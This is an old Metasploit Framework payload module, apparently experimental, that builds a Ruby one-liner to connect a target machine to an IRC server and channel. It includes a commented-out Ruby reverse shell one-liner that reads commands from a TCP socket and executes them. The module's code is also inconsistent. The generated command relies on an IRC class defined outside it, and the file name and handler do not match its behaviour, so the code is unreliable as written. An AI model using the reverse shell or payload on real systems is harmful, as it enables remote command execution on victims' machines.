##
# $Id: reverse_ruby.rb 6479 2009-04-13 14:33:26Z kris $
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'msf/core/handler/bind_tcp'
require 'msf/base/sessions/command_shell'


# The irc class, which talks to the server and holds the main event loop
class IRC
    def initialize(server, port, nick, channel)
        @server = server
        @port = port
        @nick = nick
        @channel = channel
    end
    def send(s)
        # Send a message to the irc server and print it to the screen
        puts "--> #{s}"
        @irc.send "#{s}\n", 0 
    end
    def connect()
        # Connect to the IRC server
        @irc = TCPSocket.open(@server, @port)
        send "USER blah blah blah :blah blah"
        send "NICK #{@nick}"
        sleep 2
        send "JOIN #{@channel}"
    end
    def evaluate(s)
        # Make sure we have a valid expression (for security reasons), and
        # evaluate it if we do, otherwise return an error message
        if s =~ /^[-+*\/\d\s\eE.()]*$/ then
            begin
                s.untaint
                return eval(s).to_s
            rescue Exception => detail
                puts detail.message()
            end
        end
        return "Error"
    end
    def handle_server_input(s)
        # This isn't at all efficient, but it shows what we can do with Ruby
        # (Dave Thomas calls this construct "a multiway if on steroids")
        case s.strip
            when /^PING :(.+)$/i
                puts "[ Server ping ]"
                send "PONG :#{$1}"
            when /^:(.+?)!(.+?)@(.+?)\sPRIVMSG\s.+\s:[\001]PING (.+)[\001]$/i
                puts "[ CTCP PING from #{$1}!#{$2}@#{$3} ]"
                send "NOTICE #{$1} :\001PING #{$4}\001"
            when /^:(.+?)!(.+?)@(.+?)\sPRIVMSG\s.+\s:[\001]VERSION[\001]$/i
                puts "[ CTCP VERSION from #{$1}!#{$2}@#{$3} ]"
                send "NOTICE #{$1} :\001VERSION Ruby-irc v0.042\001"
            when /^:(.+?)!(.+?)@(.+?)\sPRIVMSG\s(.+)\s:EVAL (.+)$/i
                puts "[ EVAL #{$5} from #{$1}!#{$2}@#{$3} ]"
                send "PRIVMSG #{(($4==@nick)?$1:$4)} :#{evaluate($5)}"
            else
                puts s
        end
    end
    def main_loop()
        # Just keep on truckin' until we disconnect
        while true
            ready = select([@irc, $stdin], nil, nil, nil)
            next if !ready
            for s in ready[0]
                if s == $stdin then
                    return if $stdin.eof
                    s = $stdin.gets
                    send s
                elsif s == @irc then
                    return if @irc.eof
                    s = @irc.gets
                    handle_server_input(s)
                end
            end
        end
    end
end

module Metasploit3

	include Msf::Payload::Single

	def initialize(info = {})
		super(merge_info(info,
			'Name'        => 'IRC client (via Ruby)',
			'Version'     => '0.0.1',
			'Description' => 'Connect to an IRC server and channel via Ruby',
			'Author'      => 'dougsko',
			'License'     => BSD_LICENSE,
			'Platform'    => 'win',
			'Arch'        => ARCH_CMD,
			'Handler'     => Msf::Handler::BindTcp,
			'Session'     => Msf::Sessions::CommandShell,
			'PayloadType' => 'cmd',
			'Payload'     => { 'Offsets' => {}, 'Payload' => '' }
		))
	end

	def generate
		return super + command_string
	end

	def command_string
		#"ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"#{"localhost"}\",\"#{"3333"}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"

        "ruby -rsocket -e '
        # The main program
        # If we get an exception, then print it out and keep going (we do NOT want
        # to disconnect unexpectedly!)
        irc = IRC.new('irc.freenode.net', 6667, 'Alt-255', '#igi')
        irc.connect()
        begin
            irc.main_loop()
        rescue Interrupt
        rescue Exception => detail
            puts detail.message()
            print detail.backtrace.join('\\n')
        retry
        end'"

	end
end
